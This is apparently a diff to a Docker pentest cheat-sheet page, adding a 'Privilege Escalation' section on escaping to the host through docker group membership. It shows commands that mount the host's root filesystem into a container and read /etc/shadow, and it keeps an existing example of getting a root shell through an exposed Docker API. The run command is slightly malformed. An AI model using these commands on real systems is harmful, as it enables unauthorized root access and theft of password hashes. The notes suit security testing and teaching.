@@ -84,6 +84,8 @@
     
         <li><a class="" href="#api">API</a></li>
     
+        <li><a class="" href="#privilege-escalation">Privilege Escalation</a></li>
+    
     </ul>
     
 
@@ -297,6 +299,16 @@ be2dd8aa8222        ubuntu:14.04        &quot;bash&quot;              5 years ag
 $ docker -H &lt;host&gt;:&lt;port&gt; exec -it &lt;container_name&gt; /bin/bash
 root@abc:/# whoami
 root
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>If the current user belong to the <code>docker</code> group then he can start a container
+with a binding to files own by root and read them:</p>
+<pre><code class="language-bash line-numbers">docker run --it --rm -v /:/mnt alpine:latest /mnt sh
+</code></pre>
+
+<p>Inside the container shell he can read all the files as root:</p>
+<pre><code class="language-bash line-numbers">cat /etc/shadow
 </code></pre>
             
           </div>
